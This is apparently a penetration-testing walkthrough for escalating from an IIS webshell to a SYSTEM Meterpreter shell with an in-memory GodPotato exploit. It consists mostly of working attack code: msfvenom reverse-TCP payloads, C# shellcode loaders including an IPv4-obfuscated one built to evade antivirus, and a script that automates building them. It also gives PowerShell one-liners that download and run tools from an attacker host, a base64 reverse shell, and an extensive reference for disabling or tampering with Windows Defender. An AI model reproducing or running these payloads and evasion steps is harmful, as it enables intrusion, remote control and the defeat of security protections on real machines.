@@ -1,0 +1,567 @@
+# GodPotato In-Memory Privilege Escalation — Full Attack Chain
+> Step-by-step walkthrough: webshell → SYSTEM meterpreter via in-memory GodPotato + Defender bypass.
+---
+## Scenario Summary
+```
+Initial access:  Webshell on IIS server (C:\inetpub\wwwroot)
+Shell user:      NT AUTHORITY\NETWORK SERVICE
+Key privilege:   SeImpersonatePrivilege
+Obstacle:        Windows Defender real-time protection active
+Target:          NT AUTHORITY\SYSTEM meterpreter shell
+Attacker IP:     192.168.45.160
+```
+---
+## Step 1: Confirm SeImpersonatePrivilege
+From your webshell or initial shell:
+```cmd
+whoami /priv
+```
+Look for `SeImpersonatePrivilege: Enabled`. This is what GodPotato exploits.
+---
+## Step 2: Generate Meterpreter Payload on Kali
+
+### Option A: Raw msfvenom (try this first — fast but might get caught by AV)
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.160 LPORT=443 -f exe -o met.exe
+```
+
+### Option B: C# Byte Array Loader (AV evasion — simplest custom compile)
+If raw msfvenom exe gets caught (Win32Error:225), compile your own.
+
+**Step 2a: Generate shellcode as C# byte array**
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.160 LPORT=443 -f csharp
+# Outputs: byte[] buf = new byte[XXX] { 0xfc, 0x48, 0x83, ... };
+# Copy this entire output
+```
+
+**Step 2b: Create the C# loader**
+```bash
+cat > met_loader.cs << 'EOF'
+using System;
+using System.Runtime.InteropServices;
+
+namespace L
+{
+    class P
+    {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+            uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+            uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        static void Main(string[] args)
+        {
+            // PASTE MSFVENOM CSHARP OUTPUT HERE
+            byte[] buf = new byte[] { 0xfc, 0x48, 0x83 /* ... rest of shellcode ... */ };
+
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+            Marshal.Copy(buf, 0, addr, buf.Length);
+            IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(thread, 0xFFFFFFFF);
+        }
+    }
+}
+EOF
+```
+
+**Step 2c: Compile on Kali (works on ARM)**
+```bash
+sudo apt install mono-devel -y    # install mono if needed
+mcs -platform:x64 -target:exe -out:met.exe met_loader.cs
+```
+
+---
+
+### Option C: C# IPv4 Formatter Loader (Extra AV evasion — shellcode disguised as IP addresses)
+If the byte array loader still gets caught, this stores shellcode as IPv4 address strings so the binary looks like a networking tool to static AV analysis.
+
+**Step 2a: Generate raw shellcode**
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.160 LPORT=443 -f raw -o payload.bin
+```
+
+**Step 2b: Convert shellcode to IPv4 strings**
+```bash
+cat > ipv4_format.py << 'PYEOF'
+#!/usr/bin/env python3
+import sys
+
+with open(sys.argv[1], 'rb') as f:
+    shellcode = f.read()
+
+# Pad to multiple of 4
+while len(shellcode) % 4 != 0:
+    shellcode += b'\x90'
+
+ips = []
+for i in range(0, len(shellcode), 4):
+    ip = f"{shellcode[i]}.{shellcode[i+1]}.{shellcode[i+2]}.{shellcode[i+3]}"
+    ips.append(f'"{ip}"')
+
+print(f'string[] ipAddrs = new string[] {{ {", ".join(ips)} }};')
+print(f'// Total IPs: {len(ips)}', file=sys.stderr)
+PYEOF
+
+python3 ipv4_format.py payload.bin > ip_array.txt
+cat ip_array.txt
+# Outputs: string[] ipAddrs = new string[] { "252.72.131.228", "240.232.192.0", ... };
+```
+
+**Step 2c: Create the IPv4 decoder loader**
+```bash
+cat > met_ipv4_loader.cs << 'EOF'
+using System;
+using System.Net;
+using System.Runtime.InteropServices;
+
+namespace L
+{
+    class P
+    {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+            uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+            uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        static void Main(string[] args)
+        {
+            // PASTE ipv4_format.py OUTPUT HERE
+            string[] ipAddrs = new string[] { "252.72.131.228", "240.232.192.0" /* ... */ };
+
+            // Convert IP strings back to shellcode bytes
+            byte[] buf = new byte[ipAddrs.Length * 4];
+            for (int i = 0; i < ipAddrs.Length; i++)
+            {
+                byte[] ipBytes = IPAddress.Parse(ipAddrs[i]).GetAddressBytes();
+                Array.Copy(ipBytes, 0, buf, i * 4, 4);
+            }
+
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+            Marshal.Copy(buf, 0, addr, buf.Length);
+            IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(thread, 0xFFFFFFFF);
+        }
+    }
+}
+EOF
+```
+
+**Step 2d: Compile**
+```bash
+mcs -platform:x64 -target:exe -r:System.dll -out:met.exe met_ipv4_loader.cs
+```
+
+---
+
+### Comparison: Which Loader to Use
+```
+Option A: Raw msfvenom exe
+  → Fastest, no compilation
+  → Gets caught by any AV immediately
+  → Use only if Defender is already disabled
+
+Option B: Byte array C# loader
+  → Quick to set up, one msfvenom + one compile
+  → Evades signature-based AV (unique hash per compile)
+  → May get caught by heuristic AV (raw shellcode bytes visible in binary)
+
+Option C: IPv4 formatter C# loader
+  → Extra step (python converter) but more evasive
+  → Shellcode stored as IP address strings, not raw bytes
+  → Evades both signature and basic heuristic analysis
+  → Use when Option B still gets flagged
+```
+
+---
+
+### Automated Script for Both Loaders — Save Permanently
+```bash
+cat > ~/make_met.sh << 'SCRIPT'
+#!/bin/bash
+LHOST=$1
+LPORT=$2
+OUTPUT=${3:-met.exe}
+METHOD=${4:-byte}   # "byte" or "ipv4"
+
+if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
+    echo "Usage: ./make_met.sh LHOST LPORT [output.exe] [byte|ipv4]"
+    exit 1
+fi
+
+if [ "$METHOD" = "ipv4" ]; then
+    echo "[*] Using IPv4 formatter method..."
+    echo "[*] Generating raw shellcode..."
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o /tmp/sc.bin 2>/dev/null
+
+    echo "[*] Converting to IPv4 strings..."
+    IPARRAY=$(python3 -c "
+import sys
+with open('/tmp/sc.bin','rb') as f: sc=f.read()
+while len(sc)%4!=0: sc+=b'\x90'
+ips=[]
+for i in range(0,len(sc),4):
+    ips.append(f'\"{sc[i]}.{sc[i+1]}.{sc[i+2]}.{sc[i+3]}\"')
+print(', '.join(ips))
+")
+
+    echo "[*] Creating IPv4 loader..."
+    cat > /tmp/loader.cs << EOF
+using System;
+using System.Net;
+using System.Runtime.InteropServices;
+namespace L {
+    class P {
+        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+        [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr addr, IntPtr p, uint f, IntPtr t);
+        [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
+        static void Main() {
+            string[] d = new string[] { ${IPARRAY} };
+            byte[] buf = new byte[d.Length * 4];
+            for (int i = 0; i < d.Length; i++) {
+                byte[] b = IPAddress.Parse(d[i]).GetAddressBytes();
+                Array.Copy(b, 0, buf, i * 4, 4);
+            }
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+            System.Runtime.InteropServices.Marshal.Copy(buf, 0, addr, buf.Length);
+            IntPtr t = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(t, 0xFFFFFFFF);
+        }
+    }
+}
+EOF
+    echo "[*] Compiling..."
+    mcs -platform:x64 -target:exe -r:System.dll -out:$OUTPUT /tmp/loader.cs
+    rm /tmp/sc.bin /tmp/loader.cs
+
+else
+    echo "[*] Using byte array method..."
+    echo "[*] Generating shellcode..."
+    SHELLCODE=$(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f csharp 2>/dev/null | grep "0x" | tr -d '\n')
+
+    echo "[*] Creating byte array loader..."
+    cat > /tmp/loader.cs << EOF
+using System;
+using System.Runtime.InteropServices;
+namespace L {
+    class P {
+        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+        [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr addr, IntPtr p, uint f, IntPtr t);
+        [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
+        static void Main() {
+            byte[] buf = new byte[] { ${SHELLCODE} };
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+            System.Runtime.InteropServices.Marshal.Copy(buf, 0, addr, buf.Length);
+            IntPtr t = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(t, 0xFFFFFFFF);
+        }
+    }
+}
+EOF
+    echo "[*] Compiling..."
+    mcs -platform:x64 -target:exe -out:$OUTPUT /tmp/loader.cs
+    rm /tmp/loader.cs
+fi
+
+if [ -f "$OUTPUT" ]; then
+    echo "[+] Done: $OUTPUT ($(du -h $OUTPUT | cut -f1))"
+    echo "[*] Start handler:"
+    echo "    msfconsole -q -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run\""
+else
+    echo "[-] Compilation failed"
+fi
+SCRIPT
+chmod +x ~/make_met.sh
+```
+```bash
+# Usage:
+~/make_met.sh 192.168.45.160 443 met.exe byte    # byte array loader
+~/make_met.sh 192.168.45.160 443 met.exe ipv4    # ipv4 formatter loader
+~/make_met.sh 192.168.45.160 443                   # defaults to byte array, met.exe
+```
+
+### Why These Loaders Evade AV
+```
+Raw msfvenom exe  → known signature → Defender flags instantly
+Byte array loader → custom compile  → unique hash, no known signature
+IPv4 loader       → shellcode as IP strings → evades signature + heuristic
+
+Both methods:
+  → VirtualAlloc + CreateThread is generic Win32 API usage (not flagged)
+  → Each compilation produces a different binary hash
+  → Shellcode is embedded data, not a known malware pattern
+```
+---
+## Step 3: Host Files on Kali
+```bash
+# Put GodPotato-NET4.exe and met.exe in the same directory
+python3 -m http.server 80
+```
+---
+## Step 4: Start Meterpreter Handler
+```bash
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.160; set LPORT 443; run"
+```
+---
+## Step 5: Load GodPotato In-Memory and Verify SYSTEM
+Test that GodPotato works — run `whoami` as SYSTEM and write output to file:
+```powershell
+powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.45.160/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','whoami'))) | Out-File C:\Windows\Tasks\out.txt"
+```
+Verify:
+```cmd
+type C:\Windows\Tasks\out.txt
+```
+Should show `nt authority\system`.
+
+**Key points:**
+- `DownloadData` loads the exe bytes into memory — never touches disk
+- `Assembly.Load` loads it as a .NET assembly in the current process
+- `EntryPoint.Invoke` calls its Main method with the arguments
+- `@(,[string[]]@(...))` casts args as string array (required)
+- GodPotato is C#/.NET so `Assembly.Load` works (PrintSpoofer is C++ so it can't do this)
+---
+## Step 6: Disable Defender as SYSTEM
+GodPotato runs commands as SYSTEM, and SYSTEM can disable Defender:
+```powershell
+powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.45.160/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -nop -ep bypass Set-MpPreference -DisableRealtimeMonitoring $true')))"
+```
+Wait a few seconds for the policy to apply.
+---
+## Step 7: Download and Execute Meterpreter as SYSTEM
+Now that Defender is off, download met.exe and run it as SYSTEM:
+```powershell
+powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.45.160/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); (New-Object Net.WebClient).DownloadFile('http://192.168.45.160/met.exe','C:\Windows\Tasks\met.exe'); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','C:\Windows\Tasks\met.exe')))"
+```
+Your meterpreter handler catches a SYSTEM shell.
+---
+## Step 8: Verify
+```
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > sysinfo
+```
+---
+## Why Each Step Was Necessary
+```
+Problem 1: We're NETWORK SERVICE, not SYSTEM
+Solution:  GodPotato exploits SeImpersonatePrivilege → SYSTEM
+
+Problem 2: Can't upload binaries through webshell easily
+Solution:  Load GodPotato in memory via Assembly.Load — no file on disk
+
+Problem 3: Defender catches met.exe on disk (Win32Error:225 = virus detected)
+Solution:  Use SYSTEM access to disable Defender first, then download met.exe
+
+Problem 4: Need to do everything through a crappy webshell
+Solution:  Chain everything into single PowerShell one-liners
+```
+---
+## Troubleshooting — Errors We Hit and How We Fixed Them
+| Error | Cause | Fix |
+|---|---|---|
+| `Unable to find type [GodPotato.Program]` | Wrong class name for the assembly | Use `$asm.EntryPoint.Invoke()` instead — no class name needed |
+| `Object of type 'System.Object[]' cannot be converted to type 'System.String[]'` | Args not cast as string array | Add `[string[]]` cast: `@(,[string[]]@('-cmd','whoami'))` |
+| `Win32Error:225` | Defender caught the exe (virus detected) | Disable Defender first as SYSTEM, then re-run |
+| `Assembly.Load` succeeds but no output | Webshell doesn't show stdout | Pipe output to file: `| Out-File C:\Windows\Tasks\out.txt` |
+| GodPotato shows `CurrentUser: NT AUTHORITY\SYSTEM` but command fails | The `-cmd` command itself has issues | Prefix with `cmd /c` for cmd commands, or use full paths |
+| `DownloadData` fails | HTTP server not running or firewall | Check `python3 -m http.server 80` is running, check outbound connectivity |
+| `mcs` compilation fails on Kali | Mono not installed | `sudo apt install mono-devel -y` |
+| `mcs` fails with System.Net reference error | Missing `-r:System.dll` for IPv4 loader | Add `-r:System.dll` flag to mcs command |
+| Meterpreter doesn't connect back | Handler not running or wrong port/IP | Verify handler is listening, check LHOST/LPORT match |
+---
+## Alternative: Fully In-Memory (No File on Disk at All)
+If you don't want met.exe touching disk, use a PowerShell reverse shell instead:
+```bash
+# On Kali — generate base64 encoded PowerShell reverse shell
+echo -n '$c=New-Object Net.Sockets.TCPClient("192.168.45.160",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+"PS> ");$s.Write($sb,0,$sb.Length)};$c.Close()' | iconv -t UTF-16LE | base64 -w 0
+```
+```powershell
+powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.45.160/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -e BASE64_ENCODED_SHELL')))"
+```
+Catch with `nc -lvnp 443`. Shell comes back as SYSTEM. Nothing ever written to disk.
+
+This gives you a basic PS shell as SYSTEM. Then disable Defender from that shell and upgrade to meterpreter if needed.
+---
+# Windows Defender Command Reference
+> All commands require SYSTEM or local admin. Use GodPotato to execute as SYSTEM if needed.
+---
+## Check Defender Status
+```powershell
+# Full status
+Get-MpComputerStatus
+
+# Quick checks
+Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, BehaviorMonitorEnabled, AntispywareEnabled
+
+# Is Defender service running?
+sc query WinDefend
+Get-Service WinDefend
+
+# Check definitions age
+Get-MpComputerStatus | Select-Object AntivirusSignatureLastUpdated, AntispywareSignatureLastUpdated
+
+# From cmd
+"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -GetFiles
+```
+---
+## Disable Defender (Requires SYSTEM/Admin)
+```powershell
+# Disable real-time protection (most important)
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disable everything
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+
+# All in one line (for webshell one-liners)
+powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableScriptScanning $true"
+
+# Stop the service entirely
+sc stop WinDefend
+# May not work on newer Windows — use Set-MpPreference instead
+
+# Uninstall Defender (Server editions)
+Uninstall-WindowsFeature -Name Windows-Defender
+# Or:
+dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
+
+# Kill the process (aggressive)
+taskkill /IM MsMpEng.exe /F
+# Usually fails — MsMpEng is protected
+```
+---
+## Exclusion Paths (Stealthier Than Disabling)
+```powershell
+# Add exclusion for a directory — anything in it won't be scanned
+Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
+Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+Add-MpPreference -ExclusionPath "C:\Users\Public"
+
+# Add exclusion for a file extension
+Add-MpPreference -ExclusionExtension ".exe"
+Add-MpPreference -ExclusionExtension ".dll"
+
+# Add exclusion for a process — anything it spawns won't be scanned
+Add-MpPreference -ExclusionProcess "powershell.exe"
+Add-MpPreference -ExclusionProcess "cmd.exe"
+Add-MpPreference -ExclusionProcess "met.exe"
+
+# View current exclusions
+Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess
+
+# Remove exclusions (cleanup)
+Remove-MpPreference -ExclusionPath "C:\Windows\Tasks"
+```
+---
+## Tamper Protection
+```powershell
+# Check if tamper protection is enabled
+Get-MpComputerStatus | Select-Object IsTamperProtected
+
+# If tamper protection is ON:
+# - Set-MpPreference commands will FAIL
+# - You cannot disable Defender programmatically
+# - It can only be disabled through Windows Security GUI or Intune
+# - BUT — you can still add exclusion paths in some cases
+
+# Workaround: modify Defender via registry (sometimes works even with tamper protection)
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
+# Requires reboot or service restart to take effect
+
+# GPO-based disable (if you have GPO access)
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+```
+---
+## Submission / Scan Control
+```powershell
+# Disable cloud-delivered protection (stops cloud lookups)
+Set-MpPreference -MAPSReporting Disabled
+
+# Disable automatic sample submission
+Set-MpPreference -SubmitSamplesConsent NeverSend
+
+# Disable cloud block level
+Set-MpPreference -CloudBlockLevel Disabled
+```
+---
+## Defender Log Locations
+```powershell
+# Check what Defender caught
+Get-MpThreatDetection
+Get-MpThreat
+
+# Defender logs
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" | Select-Object -First 20
+
+# Detection history
+dir "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory"
+
+# Quarantine
+dir "C:\ProgramData\Microsoft\Windows Defender\Quarantine"
+```
+---
+## Defender via GodPotato One-Liners
+> For when you're stuck in a webshell and need to do everything through GodPotato.
+```powershell
+# Disable real-time protection
+powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -nop -ep bypass Set-MpPreference -DisableRealtimeMonitoring $true')))"
+
+# Add exclusion path
+powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -nop -ep bypass Add-MpPreference -ExclusionPath C:\Windows\Tasks')))"
+
+# Disable everything
+powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -nop -ep bypass Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true')))"
+
+# Check Defender status (write to file)
+powershell -nop -ep bypass "$bytes = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/GodPotato-NET4.exe'); $asm = [Reflection.Assembly]::Load($bytes); $asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd','powershell -nop -ep bypass Get-MpComputerStatus | Out-File C:\Windows\Tasks\defender.txt')))"
+```
+---
+## Quick Decision Tree
+```
+Need to get past Defender?
+│
+├── Are you SYSTEM/Admin?
+│   ├── YES
+│   │   ├── Tamper protection OFF? → Set-MpPreference -DisableRealtimeMonitoring $true
+│   │   ├── Tamper protection ON?  → Add exclusion path or use registry method
+│   │   └── Then download and execute payload freely
+│   │
+│   └── NO (SeImpersonatePrivilege?)
+│       ├── YES → GodPotato in-memory → disable Defender as SYSTEM → payload
+│       └── NO  → AV evasion: in-memory execution, custom compiled payloads, LOLBins
+│
+├── Can't disable Defender at all?
+│   ├── Add exclusion: Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
+│   ├── In-memory only: Assembly.Load, IEX, no file on disk
+│   ├── Custom compile: mcs on Kali, unique hash per build
+│   └── PowerShell reverse shell: no exe needed, encode with -enc
+│
+└── Payload keeps getting caught even with Defender off?
+    ├── AMSI still active → bypass AMSI separately
+    ├── AppLocker blocking → bypass paths or LOLBins
+    └── EDR (not Defender) → different product, different bypass
+```
